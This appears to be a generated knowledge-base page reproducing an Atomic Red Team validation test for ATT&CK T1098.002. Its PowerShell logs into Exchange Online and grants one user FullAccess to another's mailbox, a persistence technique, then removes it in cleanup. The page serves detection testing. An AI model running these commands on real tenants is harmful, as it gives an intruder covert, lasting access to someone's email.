---
atomic_guid: "17d046be-fdd0-4cbb-b5c7-55c85d9d0714"
title: "EXO - Full access mailbox permission granted to a user"
framework: "atomic"
generated: "true"
attack_technique_id: "T1098.002"
attack_technique_name: "Account Manipulation: Additional Email Delegate Permissions"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.002/T1098.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "17d046be-fdd0-4cbb-b5c7-55c85d9d0714"
  - "EXO - Full access mailbox permission granted to a user"
platforms:
  - "office-365"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# EXO - Full access mailbox permission granted to a user

Give a nominated user, full mailbox delegation access of another user.
This can be used by an adversary to maintain persistent access to a target's mailbox in M365.

## Metadata

- Atomic GUID: 17d046be-fdd0-4cbb-b5c7-55c85d9d0714
- Technique: T1098.002: Account Manipulation: Additional Email Delegate Permissions
- Platforms: office-365
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1098.002/T1098.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1098-account_manipulation|T1098.002]]

## Input Arguments

### delegate_target

- description: office-365 target_email
- type: string
- default: delegate@contoso.com

### operator_mailbox

- description: office-365 target_email
- type: string
- default: operator@contoso.com

### password

- description: office-365 password
- type: string
- default: o365_password_test

### username

- description: office-365 username
- type: string
- default: o365_user_test@contoso.com

## Dependencies

ExchangeOnlineManagement PowerShell module must be installed

### Prerequisite Check

```powershell
$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}
```

### Get Prerequisite

```powershell
Install-Module -Name ExchangeOnlineManagement
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Import-Module ExchangeOnlineManagement
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Add-MailboxPermission -Identity "#{delegate_target}" -User "#{operator_mailbox}" -AccessRights FullAccess -InheritanceType All
Disconnect-ExchangeOnline -Confirm:$false
```

### Cleanup

```powershell
Import-Module ExchangeOnlineManagement
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Remove-MailboxPermission -Identity "#{delegate_target}" -User "#{operator_mailbox}" -AccessRights FullAccess -InheritanceType All -Confirm:$false
Disconnect-ExchangeOnline -Confirm:$false
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.002/T1098.002.yaml)
